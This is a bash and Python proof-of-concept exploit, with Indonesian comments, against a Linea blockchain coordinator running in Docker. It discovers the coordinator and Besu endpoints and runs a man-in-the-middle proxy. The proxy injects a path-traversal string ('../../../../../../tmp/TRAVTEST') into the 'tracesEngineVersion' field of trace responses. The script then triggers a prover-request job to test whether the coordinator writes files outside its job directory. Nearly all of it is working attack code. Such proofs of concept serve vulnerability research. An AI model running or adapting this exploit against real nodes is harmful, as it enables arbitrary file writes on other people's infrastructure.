#!/bin/bash
set -u
OUT="poc_traversal_results.txt"; : > "$OUT"; exec > >(tee -a "$OUT") 2>&1
C=$(docker ps --format '{{.Names}}' | grep -iE coordinator | head -n1)
P=$(docker logs "$C" 2>&1 | grep -oiE 'JSON-RPC server started port=[0-9]+' | tail -n1 | grep -oE '[0-9]+$'); P=${P:-9546}
IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}' "$C" | awk '{print $1}')
GW=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.Gateway}} {{end}}' "$C" | awk '{print $1}')
RPC="http://$IP:$P/"; HD=$(docker inspect -f '{{range .Mounts}}{{if eq .Destination "/data"}}{{.Source}}{{end}}{{end}}' "$C")
BESU=""
for c in $(docker ps --format '{{.Names}}' | grep -v "^$C$"); do
  bip=$(docker inspect -f '{{range $k,$v := .NetworkSettings.Networks}}{{$v.IPAddress}} {{end}}' "$c" | awk '{print $1}')
  r=$(curl -s -m 2 -X POST "http://$bip:8545" -H 'Content-Type: application/json' \
      -d '{"jsonrpc":"2.0","method":"linea_getBlockTracesCountersV2","params":[{"blockNumber":1}],"id":1}' 2>/dev/null)
  echo "$r" | grep -q tracesCounters && { BESU="http://$bip:8545"; break; }
done
HX=$(curl -s -m 5 -X POST "$BESU" -H 'Content-Type: application/json' -d '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' 2>/dev/null | grep -oE '0x[0-9a-fA-F]+' | head -n1)
HEAD=$(( ${HX:-10} )); START=$((HEAD-1)); END=$HEAD
mkdir -p "$HD/conflation-backtesting"
echo "[+] RPC=$RPC | BESU=$BESU | RANGE=$START..$END | DATA=$HD"

TRAV="..%2F..%2F..%2F..%2Ftmp%2FTRAV$(date +%s)"   # encoded utk URL; MITM akan decode & pakai sebagai version
MARK="TRAV$(date +%s)"; export MARK BESU_URL="$BESU"
fuser -k 12349/tcp 2>/dev/null; sleep 1
python3 - <<'PY' > /dev/null 2>&1 &
import http.server, json, os, urllib.request
UP=os.environ["BESU_URL"]
def fwd(body):
    req=urllib.request.Request(UP,data=body,headers={"Content-Type":"application/json"},method="POST")
    with urllib.request.urlopen(req,timeout=120) as r: return r.read()
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        n=int(self.headers.get("Content-Length") or 0); body=self.rfile.read(n)
        resp=fwd(body)
        try:
            m=json.loads(body).get("method","")
            if m=="linea_generateConflatedTracesToFileV2":
                o=json.loads(resp); res=o.get("result") or {}
                res["tracesEngineVersion"]="../../../../../../tmp/TRAVTEST"  # traversal di VERSION
                o["result"]=res; resp=json.dumps(o).encode()
                print("TAMPERED version -> traversal", flush=True)
        except Exception as e: print("err",e, flush=True)
        self.send_response(200); self.send_header("Content-Type","application/json")
        self.send_header("Content-Length",str(len(resp))); self.end_headers(); self.wfile.write(resp)
    def log_message(self,*a): pass
http.server.ThreadingHTTPServer(("0.0.0.0",12349),H).serve_forever()
PY
MP=$!; sleep 1
echo "[+] MITM :12349 — version traversal aktif"
R=$(curl -s --max-time 10 -X POST "$RPC" -H 'Content-Type: application/json' -d "{
  \"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":1,
  \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
  \"tracesApi\":{\"endpoint\":\"http://$GW:12349\",\"requestLimitPerEndpoint\":100},
  \"shomeiApi\":{\"endpoint\":\"http://$GW:12345\",\"requestLimitPerEndpoint\":100}}]}")
echo "    Job: $R"
echo "[*] Tunggu 120s..."; sleep 120
echo "=== HASIL ==="
echo "(a) Apakah muncul file TRAVTEST di luar jobDirectory (arbitrary write)?"
find /tmp -maxdepth 1 -name "TRAVTEST*" 2>/dev/null; ls -la /tmp/TRAVTEST* 2>/dev/null
find "$HD" -name "*TRAVTEST*" 2>/dev/null | head -5
echo "(b) Nama file request yang benar-benar ditulis:"
find "$HD/conflation-backtesting" -name "*.json" -mmin -5 2>/dev/null | head -5
echo "(c) Error koordinator soal traversal?"
docker logs "$C" --since 3m 2>&1 | grep -iE "TRAVTEST|InvalidPath|illegal|traversal|escape" | head -5
kill $MP 2>/dev/null; fuser -k 12349/tcp 2>/dev/null
echo "Cleanup: docker restart $C"
